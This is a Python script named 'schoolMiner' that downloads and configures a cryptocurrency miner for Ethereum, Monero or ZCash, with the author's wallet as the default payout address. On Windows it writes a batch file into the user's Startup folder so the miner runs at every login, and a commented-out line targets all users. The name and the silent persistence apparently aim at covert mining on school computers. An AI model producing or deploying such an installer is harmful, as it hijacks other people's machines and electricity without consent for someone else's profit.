#!/usr/bin/python
from download_miner import download
from unzip import unzip
from get_architecture import get_architecture
from configure_miner import configure
from os import chdir, getlogin
from platform import system as os
import configparser

config = configparser.ConfigParser()
print("Welcome to schoolMiner")
if config.read('config.cfg') == []:

    print("Which coin you want to mine?\n"
        "Available Coins:\n"
        " - Ethereum (ETH)\n"
        " - Monero (XMR)\n"
        " - ZCash (ZEC)\n")
    coin = input("Coin: ").upper()

    if coin == "ZEC" or coin == "XMR":
        method = input("CPU or GPU? ").upper()
        if method == "GPU":
            method = input("AMD or NVIDIA? ").upper()

    elif coin == "ETH": # Ethereum can be mined only by GPU :(
        method = "GPU"

    addr = input("Enter your %s address (default is mine): " % coin)
else:
    coin = config['main']['coin']
    method = config['main']['method']
    addr = config['main']['addr']
    print(coin)
    print(method)
    print(addr)
fname = download(coin, method) 
unzip(fname)
configure(coin, method, get_architecture(), addr)

if os() == "Windows":
    chdir(r'C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup' % getlogin())
    #chdir(r'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp') # For all users
    xd = open("Miner.bat", "w", encoding="utf-8")
    xd.write("C: \n")
    xd.write("cd C:/Users/%s/miner \n" % getlogin())
    xd.write("start start.bat")
    xd.close()
    